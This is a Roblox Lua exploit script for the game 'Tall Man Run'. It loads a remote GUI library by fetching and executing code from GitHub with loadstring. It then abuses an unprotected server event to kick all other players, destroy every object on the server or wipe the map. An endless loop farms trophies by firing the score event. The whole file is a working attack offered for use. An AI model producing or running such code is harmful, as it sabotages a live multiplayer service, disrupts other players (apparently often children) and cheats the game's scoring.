--Created By Exxen#0001
--Updated and Improved by ! ððªð¶ð¼ð½ð®ð»  ðð¯ð¸ð·ð¼ð¸#0350
--All credits to https://scriptblox.com/script/Tall-Man-Run-Kick-all-and-destroy-server-FE-8245 and https://scriptblox.com/script/Tall-Man-Run-INF-Points-basically-do-nothing-on-kids-game-7803
--Change the number to 12 if you're going AFK for wins
--Keep the number to 5 if you're playing the game and want to win every time
--Settings:
local args = {
    [1] = 5 --how much trophies you wanna get per .5 seconds
}
local Mercury = loadstring(game:HttpGet("https://raw.githubusercontent.com/deeeity/mercury-lib/master/src.lua"))()

local GUI = Mercury:Create{
    Name = "Time To Destroy",
    Size = UDim2.fromOffset(600, 400),
    Theme = Mercury.Themes.Dark,
    Link = "tallmanrun.destroyer"
}

local main = GUI:Tab{
 Name = "Destroyer",
 Icon = "rbxassetid://6034754445"
}

main:Button{Name = "Kick Others",Description = "Kicks others",Callback = function()
    for _,v in pairs(game.Players:GetPlayers()) do
        if v~=game.Players.LocalPlayer then
            local ohString1 = "Destroy"
            local ohInstance2 = v
            
            game:GetService("ReplicatedStorage").Events.Props.PropRE:FireServer(ohString1, ohInstance2)
        end
    end
end}

main:Button{Name = "Destroy Everything",Description = "Will kick you too",Callback = function()
    for _ ,v in pairs(game:GetDescendants()) do
        if v~=game.Players.LocalPlayer or not v:IsDescendantOf(game.Players.LocalPlayer) then
            local ohString1 = "Destroy"
            local ohInstance2 = v
            
            game:GetService("ReplicatedStorage").Events.Props.PropRE:FireServer(ohString1, ohInstance2)
        end
    end
end}

main:Button{Name = "Destroy Map",Description = "Only destroys map",Callback = function()
    for _ ,v in pairs(game.Workspace:GetDescendants()) do
            local ohString1 = "Destroy"
            local ohInstance2 = v
            
            game:GetService("ReplicatedStorage").Events.Props.PropRE:FireServer(ohString1, ohInstance2)
    end
end}
while true do
game:GetService("ReplicatedStorage").Events.Gaming.ScoreRE:FireServer(unpack(args))
wait (0.5)
end